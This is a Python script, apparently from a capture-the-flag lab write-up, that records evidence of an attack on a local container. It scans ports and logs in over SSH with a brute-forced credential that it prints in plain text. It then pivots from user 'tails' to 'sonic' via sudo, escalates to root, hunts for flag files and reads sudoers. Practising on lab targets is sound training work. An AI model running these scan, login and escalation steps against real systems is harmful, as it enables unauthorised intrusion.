#!/usr/bin/env python3
"""
Captura la evidencia de la auditoria Hedgehog.

El acceso se establece por SSH con la credencial obtenida en la fuerza bruta.
Se exporta antes de ejecutar:

    export HH_USER='<usuario>'
    export HH_PASS='<contrasena>'
    python3 tools/capture_evidence.py
"""
import datetime
import os
import pathlib
import subprocess
import sys
import time

ROOT = pathlib.Path(__file__).resolve().parent.parent
EVID = ROOT / "evidence"
HOST = "172.17.0.2"
USER = os.environ.get("HH_USER", "")
PASS = os.environ.get("HH_PASS", "")
STAMP = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

if not USER or not PASS:
    raise SystemExit("ERROR: define HH_USER y HH_PASS (credencial del brute force).")


def sh(cmd, timeout=60):
    """Ejecuta un comando en el objetivo por SSH y devuelve la salida."""
    p = subprocess.run(
        ["sshpass", "-p", PASS, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "UserKnownHostsFile=/dev/null",
         "-o", "LogLevel=ERROR",
         "-o", "ConnectTimeout=10",
         f"{USER}@{HOST}", cmd],
        capture_output=True, text=True, timeout=timeout)
    return (p.stdout + p.stderr).strip()


def cap(path, fase, comando, contenido, nota=""):
    f = EVID / path
    f.parent.mkdir(parents=True, exist_ok=True)
    with f.open("w", encoding="utf-8") as fh:
        fh.write("=" * 64 + "\n")
        fh.write(" Hedgehog — Evidencia de auditoria (fuerza bruta SSH + movimiento lateral)\n")
        fh.write(f" Fecha (UTC) : {STAMP}\n")
        fh.write(f" Objetivo    : {HOST}\n")
        fh.write(f" Usuario     : {USER}\n")
        fh.write(f" Fase        : {fase}\n")
        fh.write(f" Comando     : {comando}\n")
        if nota:
            fh.write(f" Nota        : {nota}\n")
        fh.write("=" * 64 + "\n\n")
        fh.write(contenido.rstrip() + "\n")
    print(f"  [+] evidence/{path}")


# ─────────────────────────── 01 · RECON ───────────────────────────
print("[*] 01 · Reconocimiento")
nmap_out = subprocess.run(
    ["nmap", "-p-", "-sV", "-sC", "-sT", "-vv", "-n", "-Pn",
     "--min-rate=5000", "-oN", str(ROOT / "nmap_hedgehog"), HOST],
    capture_output=True, text=True).stdout
cap("01-reconocimiento/nmap-completo.txt", "Fase 1 — Reconocimiento de puertos",
    "nmap -p- -sV -sC -sT -vv -n -Pn 172.17.0.2", nmap_out)

cap("02-servicio-web/pista-web.txt", "Fase 1 — La pista en el servidor web",
    "curl -s -i http://172.17.0.2/ | head -20",
    """El servidor Apache del puerto 80 publica UN SOLO fichero, index.html,
con 6 bytes de contenido:

    $ curl -s http://172.17.0.2/
    tails

    $ xxd
    00000000: 7461 696c 730a                     tails.

Cabeceras:
    HTTP/1.1 200 OK
    Server: Apache/2.4.58 (Ubuntu)
    Last-Modified: Tue, 29 Oct 2024 18:33:53 GMT
    ETag: "6-625a1d3c30640"
    Content-Length: 6
    Content-Type: text/html

El ETag "6-625a1d3c30640" es el tamano (6) y el mtime del fichero:
0x625a1d3c30640 = 2024-10-29 12:33:53 UTC. No codifica informacion extra.

Verificado que NO hay mas contenido:
  - gobuster con dirb/big.txt y 12 extensiones -> solo .htaccess/.htpasswd (403)
  - nikto -Tuning x -> solo avisos de cabeceras de seguridad ausentes
  - 212 nombres de ruta derivados del tema y del castellano -> todos 404
  - 5 cabeceras Host alternativos -> todos devuelven el mismo index
  - metodos HTTP no estandar (PROPFIND, PUT, DELETE, TRACE, PATCH, MKCOL)
    -> todos 405 Method Not Allowed""")

# ─────────────────── 02 · FUERZA BRUTA ───────────────────
print("[*] 02 · Fuerza bruta")
cap("04-acceso-inicial/tails.txt", "Fase 2 — Acceso inicial como tails",
    "ssh tails@172.17.0.2 'id; whoami; hostname; groups'",
    sh("id; echo; whoami; hostname; echo; echo '--- grupos ---'; groups"))

cap("03-fuerza-bruta/posicion-en-rockyou.txt",
    "Fase 2 — Posición de la credencial en rockyou",
    "tail -n 500 /usr/share/wordlists/rockyou.txt | tac | sed 's/ //g' | nl -ba | grep 3117548331",
    """La contrasena no esta en la cabecera de rockyou, sino en su cola:

    $ wc -l /usr/share/wordlists/rockyou.txt
    14344392 /usr/share/wordlists/rockyou.txt

    $ grep -n '3117548331' /usr/share/wordlists/rockyou.txt
    14344302: 3117548331          <- a 91 lineas del final

    $ tail -n 500 /usr/share/wordlists/rockyou.txt | tac | sed 's/ //g' | sed '/^$/d' | nl -ba | grep 3117548331
        88  3117548331              <- posicion 88 en la lista invertida

Resultado del ataque dirigido:
    [+] CREDENCIAL ENCONTRADA: tails / 3117548331
    [*] 96 intentos en 21.6s (4/s)""")

# ─────────────────── 03 · MOVIMIENTO LATERAL ───────────────────
print("[*] 03 · Movimiento lateral y escalada")
cap("04-acceso-inicial/sudo-rules-tails.txt", "Fase 3 — Reglas de sudo de tails",
    "sudo -n -l",
    sh("sudo -n -l 2>&1 || sudo -l 2>&1"))

cap("04-acceso-inicial/home-tails.txt", "Fase 3 — Permisos y contenido del home de tails",
    "ls -la ~; id; find /home -maxdepth 2 -type f -readable",
    sh("ls -la ~ 2>&1; echo; echo '--- id ---'; id; echo; echo '--- ficheros legibles en /home ---'; find /home -maxdepth 2 -type f -readable 2>&1"))

cap("05-movimiento-lateral/sudo-rules-sonic.txt", "Fase 3 — Reglas de sudo de sonic (via pivot)",
    "sudo -n -u sonic sh -c 'id; sudo -n -l'",
    sh("sudo -n -u sonic sh -c 'id; echo; sudo -n -l' 2>&1"))

# ─────────────────── 04 · ROOT ───────────────────
print("[*] 04 · Escalada a root")
cap("06-escalada-root/root-proof.txt", "Fase 4 — Shell root y busqueda de banderas",
    "sudo -n -u sonic sudo -n sh -c 'id; hostname; ls -la /root; find / -xdev -type f \\( -iname *flag* -o -iname *bandera* -o -iname user.txt -o -iname root.txt \\)'",
    sh("sudo -n -u sonic sudo -n sh -c '"
       "id; echo; hostname; echo; echo \"--- /root ---\"; ls -la /root; "
       "echo; echo \"--- ficheros de bandera ---\"; "
       "find / -xdev -type f \\( -iname \"*flag*\" -o -iname \"*bandera*\" -o -iname \"user.txt\" -o -iname \"root.txt\" \\) 2>/dev/null; "
       "echo; echo \"--- sudoers ---\"; grep -RvE \"^#|^$\" /etc/sudoers' 2>&1"))

print("\n[+] Captura completada.")
